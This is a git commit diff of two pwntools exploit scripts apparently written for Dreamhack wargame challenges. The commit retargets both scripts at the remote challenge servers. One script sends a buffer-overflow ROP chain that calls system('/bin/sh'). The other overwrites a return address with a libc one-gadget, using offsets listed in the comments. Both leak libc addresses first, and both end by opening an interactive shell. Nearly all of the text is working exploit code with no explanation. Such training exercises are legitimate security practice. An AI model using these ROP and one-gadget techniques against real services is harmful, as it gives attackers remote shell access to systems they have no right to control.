b95b14c0bfd66130defd1217a73aceb4be9d49b7
Your Name <you@example.com>
2020-10-18 06:27:16 -0700

    t

--- dreamhack/basic_rop_x64/ex.py
+++ dreamhack/basic_rop_x64/ex.py
@@ -1,10 +1,12 @@
 from pwn import *
 context.update(log_level = 'debug')
 p = process('basic_rop_x64')
+p = remote('host1.dreamhack.games', 8626)
 
 p.recvrepeat(1)
 
 libc = ELF('libc.so.6')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 elf = ELF('basic_rop_x64')
 addr_got_read = elf.got['read']
 addr_plt_puts = elf.plt['puts']
@@ -29,7 +31,8 @@ addr_popRSI = 0x0000000000400881
 #addr_execve = addr_libc_base + libc.symbols['execve']
 addr_execve = addr_libc_base + libc.symbols['system']
 log.info('execve : ' + hex(addr_execve))
-payload = 'a'*0x48 + p64(addr_popRDI) + p64(addr_binsh) +  p64(addr_execve)
-raw_input('debug : ' + str(p.pid))
+#payload = 'a'*0x48 + p64(addr_popRDI) + p64(addr_binsh) +  p64(addr_popRSI) + p64(0)*2 + p64(addr_execve) + p64(0)*0x10
+payload = 'a'*0x48 + p64(addr_popRDI) + p64(addr_binsh) +   p64(addr_execve)
+#raw_input('debug : ' + str(p.pid))
 p.sendline(payload)
 p.interactive()
--- dreamhack/oneshot/ex.py
+++ dreamhack/oneshot/ex.py
@@ -2,17 +2,51 @@ from pwn import *
 
 context.update(log_level='debug')
 
-p = process('oneshot')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-offset_stdout = libc.symbols['stdout']
+#p = process('oneshot')
+p = remote('host1.dreamhack.games', 17982)
+libc = ELF('libc.so.6')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+offset_stdout = libc.symbols['_IO_2_1_stdout_']
 log.info('offset_stdout: ' + hex(offset_stdout))
 addr_libc_stdout = int(p.recvline().split(' ')[1], 16)
 addr_libc_base = addr_libc_stdout - offset_stdout
 
+'''remote
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+
+'''local
+0x4f365 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a45c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
 log.info('addr_libc_stdout: ' + hex(addr_libc_stdout))
 log.info('addr_libc_base: ' + hex(addr_libc_base))
-
-raw_input('debug: ' + str(p.pid))
-p.sendline('a'*0x18 + p64(0) + 'b'*8 + 'A'*8)
+offset_oneshot = 0xf1147
+addr_oneshot = addr_libc_base + offset_oneshot
+p.sendline('a'*0x18 + p64(0) + 'b'*8 + p64(addr_oneshot))
 
 p.interactive()
